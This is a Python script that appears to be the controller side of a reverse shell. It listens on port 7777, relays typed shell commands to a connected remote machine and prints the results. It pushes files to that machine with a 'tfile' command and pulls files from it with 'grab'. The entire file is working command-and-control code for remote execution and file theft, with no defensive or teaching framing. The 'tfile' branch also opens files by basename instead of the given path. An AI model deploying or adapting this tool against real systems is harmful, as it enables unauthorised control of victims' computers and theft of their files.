import socket
import struct
import os
from tqdm import tqdm

buffer_size = 1024 * 4

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('0.0.0.0', 7777))
    s.listen(1)
    client_socket, addr = s.accept()
    cwd_size = struct.unpack('>I', client_socket.recv(4))[0]
    cwd = client_socket.recv(cwd_size).decode()

    while True:
        command = input(f'{cwd} $')
        split_command = command.split()
        if command == 'QUIT':
            client_socket.sendall(struct.pack('>I', len(command.encode())) + command.encode())
            s.close()
            break
        elif split_command[0].lower() == 'tfile':
            file_path = split_command[1]
            file_name = os.path.basename(file_path)
            client_socket.sendall(struct.pack('>I', len(command.encode())) + command.encode())
            file_size = os.path.getsize(file_name)
            client_socket.send(struct.pack('>Q', file_size))
            with open(file_name, 'rb') as file:
                data = file.read(buffer_size)
                with tqdm(total=round(file_size / (1024 ** 2), 1), desc=f'Transferring {file_name}', unit='MiB',
                          bar_format=
                          "{desc}: {percentage:.0f}%|{bar}| {n:.1f}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]") as pbar:
                    while data:
                        client_socket.sendall(data)
                        data = file.read(buffer_size)
                        data_size = len(data)
                        pbar.update(data_size / (1024 ** 2))
        elif split_command[0].lower() == 'grab':
            file_name = split_command[1]
            client_socket.sendall(struct.pack('>I', len(command.encode())) + command.encode())
            file_size = struct.unpack('>Q', client_socket.recv(8))[0]
            with open(file_name, 'wb') as file:
                with tqdm(total=round(file_size / (1024 ** 2), 1), desc=f'Transferring {file_name}', unit='MiB',
                          bar_format=
                          "{desc}: {percentage:.0f}%|{bar}| {n:.1f}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]") as pbar:
                    remaining_size = file_size
                    while remaining_size > 0:
                        data_size = min(buffer_size, remaining_size)
                        data = client_socket.recv(data_size)
                        if not data:
                            break
                        file.write(data)
                        remaining_size -= len(data)
                        pbar.update(data_size / (1024 ** 2))
                    file.close()
        else:
            client_socket.sendall(struct.pack('>I', len(command.encode())) + command.encode())
        output_len = struct.unpack('>I', client_socket.recv(4))[0]
        output = client_socket.recv(output_len).decode()
        cwd_len = struct.unpack('>I', client_socket.recv(4))[0]
        cwd = client_socket.recv(cwd_len).decode()
        print(output)
    s.close()
